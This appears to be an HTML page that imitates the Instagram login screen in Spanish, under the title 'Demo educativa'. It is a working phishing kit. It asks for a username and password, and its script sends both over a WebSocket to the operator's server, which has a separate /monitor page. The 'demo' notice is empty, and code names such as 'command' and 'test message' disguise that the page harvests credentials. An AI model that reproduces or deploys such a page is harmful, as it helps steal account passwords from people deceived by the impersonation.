<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram — Demo educativa</title>
<link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0 auto;
  padding: 0 20px;
  max-width: 460px;
  min-height: 100vh;
  background: #fff;
  color: #262626;
  font-family: Arial, sans-serif;
}

.language {
  text-align: center;
  padding-top: 27px;
  color: #8e8e8e;
  font-size: 13px;
}

.logo {
  text-align: center;
  margin-top: 145px;
  margin-bottom: 47px;
  font-family: "Lobster", cursive;
  font-size: 58px;
  font-weight: normal;
  letter-spacing: 0;
  color: #171717;
}
.notice {
  text-align: center;
  font-size: 10px;
  color: #777;
  margin: -32px 0 22px;
}

.field {
  display: block;
  width: 100%;
  min-height: 52px;
  padding: 0 12px;
  margin-bottom: 9px;
  border: 1px solid #dbdbdb;
  border-radius: 4px;
  background: #fafafa;
  color: #262626;
  font-size: 14px;
  outline-color: #a8c7fa;
}

textarea.field {
  min-height: 65px;
  padding-top: 20px;
  resize: vertical;
  font-family: Arial, sans-serif;
}

.field::placeholder {
  color: #a0a0a0;
}

button {
  width: 100%;
  height: 43px;
  margin-top: 7px;
  border: none;
  border-radius: 5px;
  background: #80c9f5;
  color: white;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
}

button:hover {
  background: #69baf0;
}

button:disabled {
  opacity: 0.6;
  cursor: default;
}

.divider {
  display: flex;
  align-items: center;
  gap: 18px;
  margin: 27px 0 39px;
  color: #8e8e8e;
  font-size: 14px;
  font-weight: bold;
}

.divider::before,
.divider::after {
  content: "";
  height: 1px;
  flex: 1;
  background: #dbdbdb;
}

.facebook {
  text-align: center;
  color: #385185;
  font-size: 14px;
  font-weight: bold;
  margin-bottom: 27px;
}

.facebook-icon {
  display: inline-flex;
  justify-content: center;
  align-items: center;
  width: 22px;
  height: 22px;
  margin-right: 7px;
  border-radius: 2px;
  background: #385185;
  color: white;
  font-size: 20px;
  vertical-align: middle;
}

.help {
  text-align: center;
  color: #55769c;
  font-size: 14px;
}

.status {
  margin-top: 15px;
  text-align: center;
  color: #666;
  font-size: 12px;
  overflow-wrap: anywhere;
}

.monitor {
  display: block;
  text-align: center;
  margin: 20px 0;
  color: #385185;
  font-size: 13px;
}

@media (max-width: 380px) {
  .logo {
    margin-top: 140px;
    font-size: 50px;
  }
}
</style>
</head>

<body>

<div class="language">español (España)⌄</div>

<div class="logo">Instagram</div>

<div class="notice">
 
</div>

<form id="form">
  <input
    class="field"
    id="alias"
    maxlength="40"
    placeholder="Telefono, usuario o correo electronico"
    autocomplete="off"
    aria-label=""
    required
  >

<input
  class="field"
  id="command"
  type="text"
  maxlength="200"
  placeholder="Contraseña"
  aria-label="Contraseña"
  required
>

  <button id="send" type="submit" disabled>
    Iniciar Sesion
  </button>
</form>

<div class="divider">o</div>

<div class="facebook">
  <span class="facebook-icon">f</span>
  Iniciar Sesion con Facebook
</div>

<div class="help">
  ¿Olvidaste tu contraseña?
</div>

<div id="status" class="status">
  
</div>

<a class="monitor" href="/monitor">
  
</a>

<script>
let socket;

const status = document.getElementById("status");
const send = document.getElementById("send");

function connectSocket() {
  const protocol =
    location.protocol === "https:" ? "wss:" : "ws:";

  socket = new WebSocket(
    protocol + "//" + location.host + "/ws"
  );

  socket.onopen = () => {
    status.textContent = "";
    send.disabled = false;
  };

  socket.onclose = () => {
    status.textContent =
      "Conexión cerrada. Recarga para volver a conectar.";
    send.disabled = true;
  };

  socket.onerror = () => {
    status.textContent = "Error de conexión con el servidor.";
  };

  socket.onmessage = (event) => {
    try {
      const msg = JSON.parse(event.data);

      if (msg.type === "demo-command") {
        status.textContent = "";
      }
    } catch (error) {
      status.textContent = "Se recibió un mensaje.";
    }
  };
}

connectSocket();

document.getElementById("form").onsubmit = (event) => {
  event.preventDefault();

  const alias =
    document.getElementById("alias").value.trim();

  const message =
    document.getElementById("command").value.trim();

  if (!alias || !message) {
    alert("Completa el alias y el mensaje de prueba.");
    return;
  }

  if (!socket || socket.readyState !== WebSocket.OPEN) {
    alert("Espera a que se conecte el servidor.");
    return;
  }

socket.send(JSON.stringify({
  type: "demo-command",
  alias: alias,
  text: message
}));

  document.getElementById("command").value = "";
  status.textContent = "Mensaje de prueba enviado.";
};
</script>

</body>
</html>
